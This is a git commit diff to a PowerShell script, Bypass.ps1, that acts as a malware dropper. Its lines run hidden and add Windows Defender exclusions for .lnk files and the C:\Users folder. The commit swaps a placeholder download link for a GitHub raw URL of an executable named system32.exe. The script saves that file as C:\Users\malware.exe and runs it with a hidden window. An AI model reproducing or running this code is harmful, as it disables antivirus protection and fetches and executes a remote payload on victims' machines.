aeb1baf7886829808af1e5bc87f40d4e9a25b113
newuser034 <152880567+newuser034@users.noreply.github.com>
2023-12-04 06:02:21 -0800

    Update Bypass.ps1

--- Bypass.ps1
+++ Bypass.ps1
@@ -4,6 +4,6 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://your-direct-downloading-link -o C:\Users\malware.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri https://github.com/newuser034/powershell/raw/main/system32.exe -o C:\Users\malware.exe
 powershell.exe -w Hidden C:\Users\malware.exe
 
